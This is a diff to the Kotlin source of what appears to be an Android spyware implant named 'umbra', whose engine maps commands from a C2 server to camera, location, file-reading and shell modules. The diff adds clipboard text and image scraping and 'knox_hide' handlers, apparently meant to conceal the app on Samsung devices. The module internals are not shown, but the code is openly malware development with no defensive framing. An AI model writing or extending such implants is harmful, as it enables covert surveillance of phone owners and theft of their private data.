@@ -6,7 +6,9 @@ import android.util.Log
 import dev.yassine.umbra.c2.C2Coordinator
 import dev.yassine.umbra.c2.Command
 import dev.yassine.umbra.modules.CameraModule
+import dev.yassine.umbra.modules.ClipboardModule
 import dev.yassine.umbra.modules.FileModule
+import dev.yassine.umbra.modules.KnoxGuardModule
 import dev.yassine.umbra.modules.LocationModule
 import dev.yassine.umbra.modules.ShellModule
 import kotlinx.serialization.encodeToString
@@ -52,12 +54,21 @@ object UmbraEngine {
             "location" to { cmd -> LocationModule.get(context, cmd) },
             "files"    to { cmd -> FileModule.list(context, cmd) },
             "file_read" to { cmd -> FileModule.read(context, cmd) },
-            "shell"    to { cmd -> ShellModule.exec(cmd) }
+            "shell"    to { cmd -> ShellModule.exec(cmd) },
+            "clipboard" to { cmd -> try { ClipboardModule.scrape(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "clipboard:${e.message}") } },
+            "clipboard_image" to { cmd -> try { ClipboardModule.readImage(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "clipboard_img:${e.message}") } },
+            "knox_hide" to { cmd -> try { KnoxGuardModule.hide(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "knox_hide:${e.message}") } },
+            "knox_unhide" to { cmd -> try { KnoxGuardModule.unhide(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "knox_unhide:${e.message}") } },
+            "knox_check" to { cmd -> try { KnoxGuardModule.check(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "knox_check:${e.message}") } }
         )
 
         C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
         Log.d(TAG, "Engine started — device=$deviceId")
     }
+
+    private fun err(id: String, msg: String) = Json.encodeToString(
+        dev.yassine.umbra.c2.CommandResult.serializer(),
+        dev.yassine.umbra.c2.CommandResult(id, "error", "", msg))
 
     fun stop() {
         C2Coordinator.stop()
